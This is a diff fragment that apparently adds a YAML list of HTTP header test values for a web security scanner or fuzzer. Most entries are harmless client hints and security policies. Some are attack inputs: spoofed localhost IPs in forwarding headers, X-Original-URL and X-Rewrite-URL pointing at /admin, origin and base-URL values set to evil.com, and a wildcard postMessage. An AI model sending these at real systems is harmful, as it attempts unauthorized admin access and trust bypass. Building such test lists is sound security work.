+  cloudflare_ip:
+    - "127.0.0.1"
+
+x_cluster_client_ip:
+  cluster_ip:
+    - "127.0.0.1"
+
+forwarded:
+  standard_header:
+    - "for=127.0.0.1"
+
+x_original_url:
+  url_override:
+    - "/admin"
+
+x_rewrite_url:
+  url_rewrite:
+    - "/admin"
+
+base_url:
+  manipulation:
+    - "http://evil.com"
+
+document_domain:
+  domain_relaxation:
+    - "document.domain='evil.com'"
+
+postmessage:
+  origin_validation:
+    - "postMessage('test','*')"
+
+websocket:
+  origin_header:
+    - "http://evil.com"
+
+  protocol_header:
+    - "chat, superchat"
+
+server_timing:
+  timing_header:
+    - "total;dur=123.4"
+
+nel:
+  network_error_logging:
+    - "{\"report_to\":\"default\",\"max_age\":31536000}"
+
+report_to:
+  reporting_endpoints:
+    - "{\"group\":\"default\",\"max_age\":31536000,\"endpoints\":[{\"url\":\"https://example.com/reports\"}]}"
+
+permissions_policy:
+  permissions:
+    - "geolocation=()"
+
+cross_origin_embedder_policy:
+  coep:
+    - "require-corp"
+
+cross_origin_opener_policy:
+  coop:
+    - "same-origin"
+
+cross_origin_resource_policy:
+  corp:
+    - "same-origin"
+
+clear_site_data:
+  data_clearing:
+    - "\"cache\", \"cookies\", \"storage\""
+
+early_hints:
+  http_status:
+    - "103"
+
+alt_svc:
+  alternative_services:
+    - "h3=\":443\"; ma=86400"
+
+accept_ch:
+  client_hints:
+    - "DPR, Viewport-Width, Width"
+
+critical_ch:
+  critical_hints:
+    - "DPR, Viewport-Width"
+
+device_memory:
+  memory_hint:
+    - "1"
+
+dpr:
+  device_pixel_ratio:
+    - "2.0"
+
+viewport_width:
+  viewport_hint:
+    - "1920"
+
+width:
+  resource_width:
+    - "1920"
+
+save_data:
+  data_saving:
+    - "on"
+
+ect:
+  effective_connection_type:
+    - "4g"
+
+rtt:
+  round_trip_time:
+    - "50"
+
+downlink:
+  bandwidth:
+    - "10"
+
+lang:
+  language:
+    - "en-US"
+
+ua:
+  user_agent_components:
+    - "Windows NT 10.0"
+
+platform:
+  platform_version:
+    - "Windows"
+
+architecture:
+  cpu_architecture:
+    - "x86"
+
+bitness:
+  cpu_bitness:
+    - "64"
+
+model:
+  device_model:
+    - "iPhone"
+
+mobile:
+  mobile_device:
+    - "?1"
